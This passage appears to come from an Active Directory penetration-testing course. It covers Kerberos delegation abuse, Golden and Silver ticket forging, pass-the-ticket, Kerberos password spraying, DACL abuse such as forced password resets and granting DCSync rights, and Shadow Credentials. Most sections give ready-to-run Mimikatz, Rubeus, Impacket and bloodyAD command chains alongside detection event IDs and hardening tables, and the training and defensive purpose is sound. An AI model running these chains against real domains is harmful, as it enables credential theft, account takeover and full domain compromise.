  • Enumerate all delegation types across the domain: 
    findDelegation.py corp.local/user:Password1 -dc-ip 10.10.10.1
  • Find unconstrained delegation hosts (excluding DCs): 
    Get-DomainComputer -Unconstrained | Where-Object {$_.DistinguishedName -notlike "*Domain Controllers*"} | Select-Object dnshostname
  • Coerce DC authentication to the unconstrained host and capture the TGT: 
    .\SpoolSample.exe DC01.corp.local YOURSERVER.corp.local
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
  • Exploit constrained delegation via S4U chain from Linux: 
    getST.py -spn cifs/DC01.corp.local -impersonate Administrator corp.local/svc_sql:Password1 -dc-ip 10.10.10.1
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
  • Abuse alternative service name to pivot from CIFS to LDAP (for DCSync): 
    getST.py -spn cifs/DC01.corp.local -impersonate Administrator -altservice ldap corp.local/svc_sql:Password1 -dc-ip 10.10.10.1
  • RBCD: create a machine account, set delegation, and request a ticket: 
    addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass123' corp.local/user:Password1 -dc-ip 10.10.10.1
rbcd.py -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write corp.local/user:Password1 -dc-ip 10.10.10.1
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator -dc-ip 10.10.10.1 corp.local/'FAKE01$':'FakePass123'
  • Inject the captured or forged ticket and access the target: 
    export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@TARGET.corp.local

6.4 Ticket Forging Attacks

A Golden Ticket is a forged TGT created using the krbtgt account's password hash. Since all TGTs in the domain are encrypted with this key, a valid Golden Ticket grants unrestricted access to any resource in the domain. Obtaining the krbtgt hash requires Domain Admin privileges (or equivalent), so this is a persistence and post-compromise technique.

6.4.1 Golden Ticket

A Golden Ticket is a forged TGT created using the krbtgt account's password hash. Since all TGTs in the domain are encrypted with this key, a valid Golden Ticket grants unrestricted access to any resource in the domain. Obtaining the krbtgt hash requires Domain Admin privileges (or equivalent), so this is a persistence and post-compromise technique.

How It Works

The KDC trusts any TGT that can be decrypted with the krbtgt key. A Golden Ticket forges a TGT with arbitrary PAC contents: any username, any group memberships, any SID. The KDC does not validate whether the user actually exists or belongs to the claimed groups.

Required information:

  • Domain SID (e.g., S-1-5-21-3263068140-2042698922-2891547269)
  • Domain FQDN (e.g., corp.local)
  • krbtgt NTLM hash (or AES256 key)
  • Username to impersonate (can be any string, even a non-existent user)
Creating Golden Tickets (Mimikatz)
# First obtain the krbtgt hash via DCSync
lsadump::dcsync /domain:corp.local /user:krbtgt

# Create the Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3263068140-2042698922-2891547269 /krbtgt:NTHASH /ptt

# With AES256 key for better OPSEC
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:AES256KEY /ptt

# Verify
klist
dir \\DC01.corp.local\C$
Creating Golden Tickets (Impacket)
# Impacket ticketer
ticketer.py -nthash NTHASH -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain corp.local Administrator

# With AES key
ticketer.py -aesKey AES256KEY -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain corp.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
Detection
  • Golden Tickets bypass the KDC for TGT issuance, so there is no Event ID 4768 (TGT request) for the forged ticket
  • Monitor for TGS-REQ (Event ID 4769) where the client is unknown or the ticket lifetime exceeds policy
  • Rotate the krbtgt password twice to invalidate all existing Golden Tickets (the KDC keeps two password versions)
  • Compare TGT encryption type with domain policy; forged tickets may use a different etype
  • Microsoft Defender for Identity can detect Golden Ticket usage through PAC anomaly analysis

6.4.2 Silver Ticket

A Silver Ticket is a forged service ticket (TGS) created using a service account's password hash. Unlike a Golden Ticket, it never touches the KDC for the target service, making it stealthier. However, it only grants access to the specific service whose hash was used.

How It Works

The service ticket is encrypted with the target service account's secret key. If you know this key (NTLM hash or AES key), you can forge a ticket with arbitrary PAC contents. The target service decrypts the ticket and trusts the PAC without validating it against the KDC (PAC validation is optional and usually disabled).

Creating Silver Tickets
# Mimikatz - forge a Silver Ticket for CIFS on DC01
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:DC01.corp.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt
# Impacket ticketer - Silver Ticket
ticketer.py -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain corp.local -spn cifs/DC01.corp.local Administrator

export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local
Service-Specific Examples
ServiceSPNUse Case
CIFScifs/host.domain.localFile share access, PsExec
LDAPldap/DC01.domain.localDCSync (directory replication)
HOSThost/host.domain.localWMI, scheduled tasks, PSRemoting
HTTPhttp/host.domain.localWeb services, WinRM
MSSQLMSSQLSvc/host.domain.local:1433Database access
Detection
  • Silver Tickets generate no Event ID 4769 (TGS request) on the DC since the KDC is not contacted
  • Event ID 4624 on the target host shows authentication from a user whose ticket was never issued by the KDC
  • Enable PAC validation on critical services (ValidateKdcPacSignature registry key)
  • Rotate service account passwords regularly

6.4.3 Pass-the-Ticket (PtT)

Pass-the-Ticket uses a stolen Kerberos ticket (TGT or TGS) to authenticate without knowing the user's password. Tickets can be extracted from LSASS memory, exported from the current session, or obtained through other attacks (AS-REPRoasting, Kerberoasting, delegation abuse).

# Rubeus - dump all tickets from the current logon session
.\Rubeus.exe dump /nowrap

# Import a ticket into the current session
.\Rubeus.exe ptt /ticket:doIFGj[...base64...]

# Mimikatz - export all tickets
sekurlsa::tickets /export

# Mimikatz - import a ticket
kerberos::ptt ticket.kirbi
# From Linux - convert between formats
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi

# Use a ccache ticket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

Methodology

  • Extract the krbtgt hash via DCSync (requires DA or replication rights): 
    lsadump::dcsync /domain:corp.local /user:krbtgt
  • Forge a Golden Ticket with Mimikatz and inject into the session: 
    kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3263068140-2042698922-2891547269 /krbtgt:NTHASH /ptt
  • Forge a Golden Ticket from Linux with Impacket: 
    ticketer.py -nthash NTHASH -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
  • Forge a Silver Ticket for a specific service (e.g., CIFS): 
    ticketer.py -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain corp.local -spn cifs/DC01.corp.local Administrator
  • Forge a Silver Ticket from Windows with Mimikatz: 
    kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:DC01.corp.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt
  • Pass-the-Ticket: extract tickets from memory and inject into a new session: 
    .\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:doIFGj[...base64...]
  • Convert ticket formats between Windows and Linux: 
    ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

6.5 Enumeration and Hardening

Kerberos pre-authentication responses reveal whether a username exists in the domain. This enables username enumeration and password spraying without generating Windows logon events (Event ID 4625) when spraying via Kerberos rather than NTLM.

6.5.1 Account Enumeration and Password Spraying with Kerberos

Kerberos pre-authentication responses reveal whether a username exists in the domain. This enables username enumeration and password spraying without generating Windows logon events (Event ID 4625) when spraying via Kerberos rather than NTLM.

# Kerbrute - username enumeration
kerbrute userenum --dc DC01.corp.local -d corp.local userlist.txt

# Kerbrute - password spraying
kerbrute passwordspray --dc DC01.corp.local -d corp.local userlist.txt 'Welcome2024!'

# Kerbrute - brute force a single user
kerbrute bruteuser --dc DC01.corp.local -d corp.local passwords.txt jsmith
OPSEC: Kerberos spraying generates Event ID 4771 (Kerberos pre-authentication failed) instead of 4625, which is often less monitored. However, account lockout policies still apply.

6.5.2 Detection

Key Windows Event IDs for detecting Kerberos attacks:

Event IDDescriptionAttack Detected
4768TGT requested (AS-REQ)AS-REPRoasting (pre-auth type 0), brute force
4769Service ticket requested (TGS-REQ)Kerberoasting (etype 0x17), constrained delegation abuse
4770Service ticket renewedTicket reuse, long-lived access
4771Kerberos pre-auth failedPassword spraying via Kerberos
4624Logon successPass-the-Ticket, Silver Ticket (logon type 3)

Anomalies to watch for:

  • High volume of 4769 events with RC4 encryption from a single source
  • 4769 events for SPNs that rarely receive requests
  • TGT usage without a corresponding 4768 event (Golden Ticket)
  • Service ticket usage without a corresponding 4769 event (Silver Ticket)
  • Tickets with abnormal lifetimes or encryption types

6.5.3 Hardening and Mitigation Summary

AttackKey Mitigations
AS-REPRoastingEnable pre-auth on all accounts; strong passwords; monitor Event ID 4768
KerberoastingUse gMSAs; enforce AES; 25+ char passwords on SPN accounts; monitor etype 0x17 in 4769
Unconstrained DelegationRemove from non-DCs; Protected Users group; sensitive flag on privileged accounts
Constrained DelegationMinimize delegation; protect delegating account credentials; Protected Users
RBCDSet MachineAccountQuota to 0; audit msDS-AllowedToActOnBehalfOfOtherIdentity; monitor Event ID 5136
Golden TicketRotate krbtgt twice; monitor for TGS without TGT; Defender for Identity
Silver TicketEnable PAC validation; rotate service account passwords; monitor anomalous 4624
Pass-the-TicketEnable Credential Guard; restrict admin logons; short ticket lifetimes

Methodology

  • Enumerate valid domain usernames via Kerberos pre-auth responses: 
    kerbrute userenum --dc DC01.corp.local -d corp.local userlist.txt
  • Password spray via Kerberos (generates 4771 instead of 4625): 
    kerbrute passwordspray --dc DC01.corp.local -d corp.local userlist.txt 'Welcome2024!'
  • Brute force a single high-value user account: 
    kerbrute bruteuser --dc DC01.corp.local -d corp.local passwords.txt jsmith
  • Verify cracked or sprayed credentials against SMB: 
    crackmapexec smb DC01.corp.local -u jsmith -p 'Welcome2024!'

7. DACL Attacks I

Discretionary Access Control Lists (DACLs) define who can access Active Directory objects and what operations they can perform. Misconfigured DACLs are a common source of privilege escalation paths in AD environments. This module covers the fundamentals of ACL-based attacks, enumeration, and exploitation.

7.1 DACL Fundamentals

Every securable object in Active Directory (users, groups, computers, OUs, GPOs) has a Security Descriptor containing:

  • DACL (Discretionary Access Control List): ordered list of Access Control Entries (ACEs) that define who can do what
  • SACL (System Access Control List): defines auditing rules (which access attempts generate security events)
  • Owner: the security principal that owns the object (owners can always modify the DACL)

Each ACE (Access Control Entry) contains:

FieldDescription
Trustee (SID)The security principal the ACE applies to
Access MaskBit flags defining the granted or denied permissions
ACE TypeAllow or Deny
Inheritance FlagsWhether the ACE is inherited from a parent container
Object TypeFor object-specific ACEs, the GUID of the property or extended right

Key abusable permissions in AD:

PermissionEffect
GenericAllFull control over the object (read, write, delete, modify DACL)
GenericWriteWrite any property on the object
WritePropertyWrite a specific property (depends on ObjectType GUID)
WriteDaclModify the object's DACL (grant yourself any permission)
WriteOwnerChange the object's owner (owners implicitly have WriteDacl)
SelfValidated write (e.g., add yourself to a group)
ForceChangePasswordReset the target user's password without knowing the current one
AllExtendedRightsAll extended rights including ForceChangePassword and DCSync

7.2 DACL Enumeration

Enumerating DACLs reveals which principals have dangerous permissions over AD objects. This is the foundation for building ACL-based attack chains.

7.2.1 PowerView ACL Enumeration

# Find all ACEs for a specific object
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner|Self"} | Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectAceType

# Resolve SIDs to names
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|Self"} | ForEach-Object {
    $_ | Add-Member -NotePropertyName "IdentityName" -NotePropertyValue (Convert-SidToName $_.SecurityIdentifier) -PassThru
} | Select-Object IdentityName, ActiveDirectoryRights, ObjectAceType

# Find ACEs for the current user across all domain objects
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "currentuser"}

7.2.2 BloodHound ACL Analysis

BloodHound automatically collects and visualizes ACL relationships. After importing SharpHound data, use these queries to identify ACL abuse paths:

# Cypher - find principals with GenericAll on Domain Admins
MATCH (n)-[:GenericAll]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}) RETURN n.name

# Find all ACL-based attack paths from owned principals
MATCH p=shortestPath((n {owned: true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(m)) RETURN p

# Find users with DCSync rights
MATCH (n)-[:GetChanges|GetChangesAll]->(d:Domain) WITH n, d MATCH (n)-[:GetChanges]->(d) MATCH (n)-[:GetChangesAll]->(d) RETURN n.name

7.2.3 Built-in Tools

# Get-Acl (AD PowerShell module required)
(Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local").Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl"} | Format-Table IdentityReference, ActiveDirectoryRights

# icacls for file system ACLs (not AD, but useful for share permissions)
icacls \\DC01\SYSVOL

7.2.4 SharpHound ACL Collection

# SharpHound - collect ACL data
.\SharpHound.exe -c ACL

# Full collection (includes ACL data)
.\SharpHound.exe -c All
# BloodHound.py from Linux
bloodhound-python -u user -p 'Password1' -d corp.local -ns 10.10.10.1 -c acl

Methodology

  • Enumerate dangerous ACEs on high-value targets with PowerView: 
    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner|Self"} | ForEach-Object { $_ | Add-Member -NotePropertyName "IdentityName" -NotePropertyValue (Convert-SidToName $_.SecurityIdentifier) -PassThru } | Select-Object IdentityName, ActiveDirectoryRights, ObjectAceType
  • Find ACEs for the current user across all domain objects: 
    Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "currentuser"}
  • Collect ACL data with SharpHound for BloodHound analysis: 
    .\SharpHound.exe -c ACL
  • Alternatively, collect ACLs from Linux with BloodHound.py: 
    bloodhound-python -u user -p 'Password1' -d corp.local -ns 10.10.10.1 -c acl
  • Query BloodHound for ACL-based attack paths from owned principals: 
    MATCH p=shortestPath((n {owned: true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(m)) RETURN p
  • Query BloodHound for users with DCSync rights: 
    MATCH (n)-[:GetChanges]->(d:Domain) MATCH (n)-[:GetChangesAll]->(d) RETURN n.name
  • Validate findings with built-in AD PowerShell tools: 
    (Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local").Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl"} | Format-Table IdentityReference, ActiveDirectoryRights

7.3 Targeted Kerberoasting and AddMembers

If you have write access to a user account (GenericAll, GenericWrite, or WriteProperty on the servicePrincipalName attribute), you can set an arbitrary SPN on the account, request a service ticket for that SPN, and crack it offline. After cracking, clean up by removing the SPN.

7.3.1 Targeted Kerberoasting

If you have write access to a user account (GenericAll, GenericWrite, or WriteProperty on the servicePrincipalName attribute), you can set an arbitrary SPN on the account, request a service ticket for that SPN, and crack it offline. After cracking, clean up by removing the SPN.

Setting an SPN on a Target Account
# PowerView - set an SPN
Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/YOURSPN'}

# Verify the SPN was set
Get-DomainUser targetuser -Properties serviceprincipalname
# From Linux with bloodyAD
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local set object targetuser servicePrincipalName -v 'fake/YOURSPN'
Kerberoasting the Target
# Rubeus - kerberoast the specific user
.\Rubeus.exe kerberoast /user:targetuser /outfile:targeted.txt
# Impacket
GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.10.1 -request-user targetuser -outputfile targeted.txt

# Crack the hash
hashcat -m 13100 targeted.txt /usr/share/wordlists/rockyou.txt
Cleanup
# Remove the SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname

# Verify
Get-DomainUser targetuser -Properties serviceprincipalname
# From Linux
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local set object targetuser servicePrincipalName

7.3.2 AddMembers

If you have GenericAll, GenericWrite, or Self (Validated Write) permissions on a group object, you can add arbitrary members to that group. This is a direct privilege escalation path when the target group has elevated privileges.

GenericAll and GenericWrite on Groups

Both GenericAll and GenericWrite grant the ability to modify group membership. The Self (Validated Write / bf9679c0-0de6-11d0-a285-00aa003049e2) right specifically allows adding yourself as a member. BloodHound represents this as the AddMember edge.

Adding Members via PowerView
# Add a user to a group
Add-DomainGroupMember -Identity "Domain Admins" -Members "targetuser"

# Verify
Get-DomainGroupMember -Identity "Domain Admins" | Where-Object {$_.MemberName -eq "targetuser"}
Adding Members via net.exe
# Built-in Windows command
net group "Domain Admins" targetuser /add /domain

# Verify
net group "Domain Admins" /domain
Adding Members via Linux Tools
# bloodyAD
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local add groupMember "Domain Admins" targetuser

# net rpc
net rpc group addmem "Domain Admins" targetuser -U corp.local/user%Password1 -S DC01.corp.local

# ldapmodify
ldapmodify -x -H ldap://DC01.corp.local -D "user@corp.local" -w 'Password1' <<EOF
dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
changetype: modify
add: member
member: CN=targetuser,CN=Users,DC=corp,DC=local
EOF

Methodology

  • Set a fake SPN on the target user (requires GenericAll/GenericWrite/WriteProperty): 
    Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/YOURSPN'}
Get-DomainUser targetuser -Properties serviceprincipalname
  • Alternatively, set the SPN from Linux with bloodyAD: 
    bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local set object targetuser servicePrincipalName -v 'fake/YOURSPN'
  • Kerberoast the targeted user and crack the hash: 
    .\Rubeus.exe kerberoast /user:targetuser /outfile:targeted.txt
  • From Linux, request the ticket and crack with hashcat: 
    GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.10.1 -request-user targetuser -outputfile targeted.txt
hashcat -m 13100 targeted.txt /usr/share/wordlists/rockyou.txt
  • Clean up by removing the SPN after cracking: 
    Set-DomainObject -Identity targetuser -Clear serviceprincipalname
Get-DomainUser targetuser -Properties serviceprincipalname
  • Add a user to a privileged group (requires GenericAll/GenericWrite/Self on the group): 
    Add-DomainGroupMember -Identity "Domain Admins" -Members "targetuser"
Get-DomainGroupMember -Identity "Domain Admins" | Where-Object {$_.MemberName -eq "targetuser"}
  • Alternatively, add group members from Linux: 
    bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local add groupMember "Domain Admins" targetuser

7.4 Password Abuse and Rights Manipulation

Several ACE types allow resetting or changing a target user's password without knowing the current password. This provides immediate access to the target account.

7.4.1 Password Abuse

Several ACE types allow resetting or changing a target user's password without knowing the current password. This provides immediate access to the target account.

ForceChangePassword

The User-Force-Change-Password extended right (GUID: 00299570-246d-11d0-a768-00aa006e0529) allows resetting a user's password. GenericAll and AllExtendedRights also include this capability. BloodHound represents this as the ForceChangePassword edge.

Using PowerView
# Reset the target's password
$newPass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $newPass

# Alternative using net.exe
net user targetuser NewPassword123! /domain
Using rpcclient
# rpcclient - reset password
rpcclient -U 'corp.local/user%Password1' DC01.corp.local -c "setuserinfo2 targetuser 23 'NewPassword123!'"
Using bloodyAD
# bloodyAD
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local set password targetuser 'NewPassword123!'

# Impacket changepasswd.py (requires current password or relevant rights)
changepasswd.py corp.local/targetuser:'OldPass'@DC01.corp.local -newpass 'NewPassword123!'

7.4.2 Granting Rights and Ownership

Higher-level DACL permissions (WriteDacl, WriteOwner, GenericAll) allow modifying the security descriptor itself, enabling you to grant yourself any permission on the target object.

WriteDacl Abuse

WriteDacl allows modifying the DACL on the target object. You can add an ACE granting yourself GenericAll, DCSync rights, or any other permission.

# PowerView - grant yourself GenericAll on the target object
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity currentuser -Rights All

# Grant DCSync rights on the domain object
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity currentuser -Rights DCSync
# From Linux with bloodyAD
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local add genericAll 'CN=Domain Admins,CN=Users,DC=corp,DC=local' currentuser

# dacledit.py (Impacket)
dacledit.py -action write -rights DCSync -principal currentuser corp.local/user:Password1 -dc-ip 10.10.10.1
WriteOwner Abuse

WriteOwner allows changing the owner of the object. Since owners implicitly have WriteDacl, this is a two-step escalation: change ownership, then modify the DACL.

# PowerView - take ownership
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity currentuser

# Now modify the DACL (as owner)
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity currentuser -Rights All
# From Linux with bloodyAD
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local set owner 'CN=Domain Admins,CN=Users,DC=corp,DC=local' currentuser

# Then grant yourself rights
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local add genericAll 'CN=Domain Admins,CN=Users,DC=corp,DC=local' currentuser
GenericAll Exploitation

GenericAll on a user object allows: resetting the password, setting an SPN (targeted Kerberoasting), modifying the msDS-KeyCredentialLink (Shadow Credentials), modifying the scriptPath (logon script attack), and adding the account to any group.

GenericAll on a computer object allows: configuring RBCD, reading LAPS passwords (if LAPS is deployed), and modifying the msDS-KeyCredentialLink.

GenericAll on a group object allows: adding/removing members, modifying group properties.

GenericAll on a GPO allows: modifying the GPO to achieve code execution on all machines the GPO applies to.

Granting DCSync Rights

DCSync requires two specific extended rights on the domain object:

  • DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
  • DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
# Grant DCSync rights via PowerView
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity currentuser -Rights DCSync

# Verify
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser currentuser).objectsid} | Select-Object ActiveDirectoryRights, ObjectAceType
# DCSync after granting rights
secretsdump.py corp.local/currentuser:Password1@DC01.corp.local -just-dc-user Administrator

Methodology

  • Force-reset a target user password with PowerView (ForceChangePassword/GenericAll): 
    $newPass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $newPass
  • Reset password from Linux with rpcclient or bloodyAD: 
    rpcclient -U 'corp.local/user%Password1' DC01.corp.local -c "setuserinfo2 targetuser 23 'NewPassword123!'"
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local set password targetuser 'NewPassword123!'
  • Abuse WriteDacl to grant yourself GenericAll on a target object: 
    Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity currentuser -Rights All
  • Abuse WriteOwner to take ownership, then modify the DACL: 
    Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity currentuser
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity currentuser -Rights All
  • Perform the same WriteOwner chain from Linux: 
    bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local set owner 'CN=Domain Admins,CN=Users,DC=corp,DC=local' currentuser
bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local add genericAll 'CN=Domain Admins,CN=Users,DC=corp,DC=local' currentuser
  • Grant DCSync rights on the domain object: 
    Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity currentuser -Rights DCSync
  • Alternatively, grant DCSync from Linux with dacledit.py: 
    dacledit.py -action write -rights DCSync -principal currentuser corp.local/user:Password1 -dc-ip 10.10.10.1
  • Execute DCSync to dump credentials: 
    secretsdump.py corp.local/currentuser:Password1@DC01.corp.local -just-dc-user Administrator

7.5 DACL Attack Summary

AttackRequired RightImpact
Targeted KerberoastingGenericAll / GenericWrite / WriteProperty (SPN)Offline password cracking of target account
Add Group MemberGenericAll / GenericWrite / Self on groupPrivilege escalation via group membership
Force Change PasswordForceChangePassword / GenericAll / AllExtendedRightsImmediate account takeover
WriteDacl AbuseWriteDaclGrant any permission (including DCSync)
WriteOwner AbuseWriteOwnerTake ownership, then WriteDacl
GenericAll on UserGenericAllPassword reset, SPN set, Shadow Credentials, logon script
GenericAll on ComputerGenericAllRBCD, LAPS password, Shadow Credentials
Grant DCSyncWriteDacl on domain objectFull domain compromise via secretsdump

Detection strategies:

  • Event ID 5136 (Directory Service Changes): monitor DACL modifications on sensitive objects (Domain Admins, Domain Controllers OU, domain root)
  • Event ID 4662 (Operation on directory object): audit access to critical AD objects
  • Event ID 4738 (User account changed): detect SPN modifications and password resets
  • Event ID 4728/4732/4756 (Member added to security-enabled group): detect unauthorized group membership changes
  • Use BloodHound regularly to identify and remediate dangerous ACL paths before attackers discover them
  • Apply the principle of least privilege to all ACL assignments; remove unnecessary GenericAll and WriteDacl permissions
  • Enable Advanced Security Audit Policy for Directory Service Access on all Domain Controllers

8. DACL Attacks II

This module builds on DACL Attacks I with advanced techniques that exploit certificate-based authentication, logon script manipulation, SPN abuse, machine account spoofing, and Group Policy Objects. These attacks leverage write permissions over specific Active Directory attributes to achieve credential theft, code execution, and privilege escalation.

8.1 Shadow Credentials

Shadow Credentials abuse the msDS-KeyCredentialLink attribute to add an attacker-controlled certificate for PKINIT pre-authentication. If an attacker has write access to this attribute on a user or computer object, they can authenticate as that principal without knowing its password.

8.1.1 PKINIT and msDS-KeyCredentialLink

PKINIT is a Kerberos extension that allows certificate-based pre-authentication. Windows Hello for Business (WHfB) uses the msDS-KeyCredentialLink attribute to store public key credentials for passwordless authentication. Each entry contains a Key Credential structure with a public key, device ID, and creation timestamp. During AS-REQ, the client signs the authenticator with the corresponding private key, and the KDC validates it against the stored public key.

The attribute accepts multiple entries, so an attacker can add a new key credential without removing existing ones.

8.1.2 Attack Prerequisites

  • Write access to msDS-KeyCredentialLink on the target object (via GenericAll, GenericWrite, WriteProperty, or similar)
  • AD CS must be deployed in the domain (the KDC needs a certificate for PKINIT validation)
  • Domain functional level of Windows Server 2016 or higher

8.1.3 Exploitation with Whisker

Whisker is a C# tool that manipulates msDS-KeyCredentialLink directly.

# List existing key credentials
Whisker.exe list /target:svc_backup

# Add a new shadow credential
Whisker.exe add /target:svc_backup /domain:corp.local /dc:dc01.corp.local

# The output provides a Rubeus command to request a TGT
Rubeus.exe asktgt /user:svc_backup /certificate:<base64_cert> /password:<generated_pass> /domain:corp.local /dc:dc01.corp.local /getcredentials /show /nowrap

# Remove the shadow credential after use
Whisker.exe remove /target:svc_backup /deviceid:<device_id>

8.1.4 Exploitation with pywhisker

pywhisker is the Python equivalent for Linux-based attacks.

# List key credentials on the target
python3 pywhisker.py -d corp.local -u attacker -p 'Password123' --target svc_backup --action list

# Add a shadow credential
python3 pywhisker.py -d corp.local -u attacker -p 'Password123' --target svc_backup --action add

# Use the generated PFX with PKINITtools to get a TGT
python3 gettgtpkinit.py -cert-pfx <output.pfx> -pfx-pass <password> corp.local/svc_backup <output.ccache>

# Clean up
python3 pywhisker.py -d corp.local -u attacker -p 'Password123' --target svc_backup --action remove --device-id <device_id>

8.1.5 UnPAC-the-Hash

After obtaining a TGT via PKINIT, the UnPAC-the-hash technique extracts the NTLM hash from the PAC. The TGT obtained through certificate authentication contains an encrypted PAC with the account's NT hash in the PAC_CREDENTIAL_INFO structure. Requesting a service ticket to the account itself (U2U) and decrypting the PAC reveals the hash.

# Extract the NT hash from a PKINIT TGT
python3 getnthash.py -key <AS-REP_encryption_key> corp.local/svc_backup
# With Rubeus, the /getcredentials flag performs UnPAC-the-hash automatically
Rubeus.exe asktgt /user:svc_backup /certificate:<base64_cert> /password:<pass> /getcredentials /show /nowrap

8.1.6 Detection

  • Event ID 5136 (Directory Service Changes) for modifications to msDS-KeyCredentialLink
  • Event ID 4768 (TGT requested) with pre-authentication type 16 (PKINIT) for accounts that do not normally use certificate authentication
  • Monitor for Whisker or pywhisker artifacts: certificate files (.pfx), unusual LDAP modify operations on KeyCredentialLink
  • Audit msDS-KeyCredentialLink entries and compare against Windows Hello for Business enrollment records

Methodology

  • Confirm write access to msDS-KeyCredentialLink on the target (GenericAll, GenericWrite, or WriteProperty) and verify AD CS is deployed in the domain
  • List existing key credentials on the target: 
    Whisker.exe list /target:svc_backup
  • Add a shadow credential with Whisker (Windows) or pywhisker (Linux): 
    Whisker.exe add /target:svc_backup /domain:corp.local /dc:dc01.corp.local
  • Linux alternative with pywhisker: 
    python3 pywhisker.py -d corp.local -u attacker -p 'Password123' --target svc_backup --action add
  • Request a TGT using the generated certificate: 
    Rubeus.exe asktgt /user:svc_backup /certificate:<base64_cert> /password:<generated_pass> /domain:corp.local /dc:dc01.corp.local /getcredentials /show /nowrap
  • Extract the NT hash via UnPAC-the-hash (Linux): 
    python3 getnthash.py -key <AS-REP_encryption_key> corp.local/svc_backup
  • Clean up by removing the shadow credential: 
    Whisker.exe remove /target:svc_backup /deviceid:<device_id>

8.2 Logon Scripts and SPN Jacking

